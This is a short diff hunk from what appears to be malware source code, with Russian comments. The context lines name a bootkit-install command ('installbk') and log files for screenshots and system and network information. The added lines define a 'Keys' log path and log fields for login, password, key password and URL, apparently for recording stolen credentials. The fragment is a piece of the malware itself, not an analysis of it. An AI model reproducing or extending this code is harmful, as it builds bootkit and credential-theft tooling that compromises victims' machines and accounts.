@@ -129,6 +129,16 @@ CSSTR EStrCommandInstallBootkit[] = "installbk";  // Команда на инсталяцию бутки
 CSSTR StrLogFileScreenShot[]  = "Screen.png";
 CSSTR StrLogFileInformation[] = "Info.txt";
 CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";
+CSSTR EStrLogKeyPath[]         = "Keys";
+
+
+// Имяена полей лога
+CSSTR EStrLogFieldLogin[]       = "Login";
+CSSTR EStrLogFieldPassword[]    = "Password";
+CSSTR EStrLogFieldKeyPassword[] = "KeyPassword";
+CSSTR EStrLogFieldURL[]         = "URL";
+
+
 
 
 // Имена функций библиотеки видеозаписи.
